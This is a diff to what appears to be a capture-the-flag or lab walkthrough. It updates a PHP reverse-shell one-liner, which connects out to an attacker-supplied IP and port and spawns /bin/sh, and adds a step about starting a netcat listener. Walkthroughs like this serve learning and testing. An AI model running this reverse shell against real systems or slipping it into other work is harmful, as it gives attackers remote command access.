@@ -128,10 +128,14 @@ Ouch ... another form <br>
   but first prepare a php shell
 
 ```bash
-php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("YOUR IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 ![run command](https://user-images.githubusercontent.com/67475596/103491856-48fa8200-4e27-11eb-8d09-7379187a7886.png)
+
+Don't forget to run netcat on the attacking machine
+
+![run_netcat](https://user-images.githubusercontent.com/67475596/103491944-db028a80-4e27-11eb-9bd4-928918dcc68d.png)
 </p>
 
 
